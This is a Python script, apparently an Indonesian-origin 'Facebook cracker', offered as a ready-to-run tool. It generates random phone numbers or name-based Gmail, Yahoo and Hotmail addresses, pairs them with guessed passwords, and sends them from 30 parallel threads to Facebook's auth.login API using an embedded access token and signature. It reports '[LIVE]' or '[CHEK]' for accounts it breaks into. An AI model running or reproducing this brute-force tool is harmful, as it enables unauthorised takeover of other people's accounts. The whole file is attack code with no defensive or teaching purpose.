
import os, re, requests
from random import randint


def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('[LIVE] %s|%s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('[CHEK] %s|%s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
 \33[31;1m[ FACEBOOK CRACKER RANDOM NUMBERS ]

\33[32;1mFill in the initial number, okay? 5 digits must not be less and not more. Example: 62877
  ''')
  kode=str(input('\33[33;1mEnter the starting number: '))
  exit('\33[36;1m The number must be 5 digits, no less and no more.') if len(kode) < 5 else ''
  exit('\33[36;1mThe number must be 5 digits, no less and no more.') if len(kode) > 5 else ''
  jml=int(input('''
  \33[36;1mEnter the number of numbers that will be made an example: 10
 \33[36;1mTotal: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  God Bless You:)
  \33;[36;1mCracking...
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Done:)')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
   \33[31;1m[ FACEBOOK CRACKER RANDOM EMAIL ]

   \33[32;1mSelect The Username:)
  Example: putri
  ''')
  nama=input(' \33[32;1m  Username? : ')
  domain=input('''
   \33[1;33mYour Domain  \33[31;1m[G]mail,  \33[0;36m[Y]ahoo, \33[36;1m [H]otmail
   \33[31;1mpilih (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  \33[31;1m Selectly Correct.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  \33[0;32mTotal Email?, Example: 10
  \33[0;32mTotal: '''))
  setpw=input('''
  \33[0;36mSet password :)
\33[0;36mExample: putri123,putri1234
  \33[0;36mSet password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
\33[33;1mGod Bless You :)
\33[1;33mCracking....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Done')

def pilih():
  print('''
  1. \33[33;1mCrack from nomor random\33[37;1m
  2. \33[33;1mCrack from email random
  ''')
  pil=int(input('\33[33;1mSelect Your Menu?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Stuppid')
 
pilih() if __name__ == '__main__' else exit('\33[31;1mError 404 Not Found:(!.')
